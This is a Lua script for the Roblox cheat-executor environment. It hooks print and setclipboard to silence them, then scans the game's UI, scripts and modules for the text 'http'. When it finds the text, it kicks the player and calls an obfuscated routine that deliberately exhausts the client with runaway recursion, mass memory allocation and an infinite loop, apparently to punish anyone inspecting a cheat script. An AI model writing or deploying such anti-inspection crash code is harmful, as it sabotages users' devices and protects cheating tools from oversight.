local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")

local function blockFunction(func)
    if func then
        hookfunction(func, function(...) return end)
    end
end

blockFunction(print)
blockFunction(setclipboard)

local function containsHttp(str)
    return str:lower():find("http") ~= nil
end

local function XVLPRCUNNRAP(message)
    local player = Players.LocalPlayer
    if player then
        player:Kick("You Are Spying And Sabotaging Our Script, Please Turn It Off:  " .. message)
        local function NNUEFZVFLYDZEKS()
            math.randomseed(os.time() + math.random())
            local function b(c)
                local d = {}
                d[c] = d
                if math.random() > 0.1 then
                    return b(c + 1)
                end
                return c
            end
            local function e()
                local f = {}
                for g = 1, math.random(1000, 5000) do
                    f[g] = string.rep("A", math.random(50, 200))
                end
                return f
            end
            local function h()
                local i = math.huge
                for j = 1, math.random(1e6, 5e6) do
                    i = i ^ i
                end
                return i
            end
            local function k()
                while true do
                    local l = math.random(1, 3)
                    if l == 1 then
                        table.insert({}, math.random())
                    elseif l == 2 then
                        math.sqrt(-math.random())
                    else
                        print("Overloading...")
                    end
                end
            end
            e()
            h()
            pcall(
                function()
                    b(0)
                end
            )
            k()
        end
        NNUEFZVFLYDZEKS()
    end
end

local function checkUIElements(parent)
    for _, element in pairs(parent:GetChildren()) do
        if containsHttp(element.Name) then
            element:Destroy()
            XVLPRCUNNRAP("HTTP Detected In UI Element Name!")
            return
        end

        if (element:IsA("TextLabel") or element:IsA("TextButton") or element:IsA("TextBox")) then
            if containsHttp(element.Text) then
                element:Destroy()
                XVLPRCUNNRAP("HTTP Detected In UI Element Text!")
                return
            end
        end
    end
end

local function monitorCoreGui()
    while task.wait(1) do
        checkUIElements(CoreGui)
    end
end

local function monitorNewPlayerGui()
    Players.PlayerAdded:Connect(function(player)
        player.ChildAdded:Connect(function(child)
            if child:IsA("ScreenGui") then
                checkUIElements(child)
            end
        end)
    end)
end

local function monitorScripts()
    for _, script in pairs(game:GetDescendants()) do
        if script:IsA("Script") or script:IsA("LocalScript") then
            local scriptSource = script.Source
            if containsHttp(scriptSource) then
                XVLPRCUNNRAP("HTTP Request Detected In Script!")
                return  
            end
        end
    end
end

local function monitorModules()
    for _, module in pairs(ReplicatedStorage:GetChildren()) do
        if module:IsA("ModuleScript") then
            local moduleSource = module.Source
            if containsHttp(moduleSource) then
                XVLPRCUNNRAP("HTTP Request Detected In Module!")
                return  
            end
        end
    end
end

task.spawn(monitorCoreGui)
task.spawn(monitorNewPlayerGui)
task.spawn(monitorScripts)
task.spawn(monitorModules)
